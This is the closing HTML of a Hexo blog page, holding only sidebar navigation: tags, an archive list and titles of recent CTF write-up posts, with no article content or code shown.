      <a data-url="http://yoursite.com/2017/09/28/Commercialapplication/" data-id="cj86rizzv0004go99c3eaww14" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/android/">android</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csaw2017/">csaw2017</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-kr/">pwnable.kr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-kr-heap/">pwnable.kr heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwntools/">pwntools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unlink/">unlink</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/android/" style="font-size: 20px;">android</a> <a href="/tags/csaw2017/" style="font-size: 10px;">csaw2017</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/pwnable-kr/" style="font-size: 13.33px;">pwnable.kr</a> <a href="/tags/pwnable-kr-heap/" style="font-size: 10px;">pwnable.kr heap</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/shellcode/" style="font-size: 10px;">shellcode</a> <a href="/tags/stack/" style="font-size: 10px;">stack</a> <a href="/tags/unlink/" style="font-size: 10px;">unlink</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2017/09/30/pablelgi/">pwnable.kr之simple login</a>
          </li>
        
          <li>
            <a href="/2017/09/29/memcpy/">pwnable.kr之memcpy</a>
          </li>
        
          <li>
            <a href="/2017/09/29/asmlong/">pwnable.kr之asm</a>
          </li>
        
          <li>
            <a href="/2017/09/28/csaw2017-cvv/">CSAW 2017 CVV及tabIEZ writeup</a>
          </li>
        
          <li>
            <a href="/2017/09/28/helctf/">360 Hello CTF</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2017 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>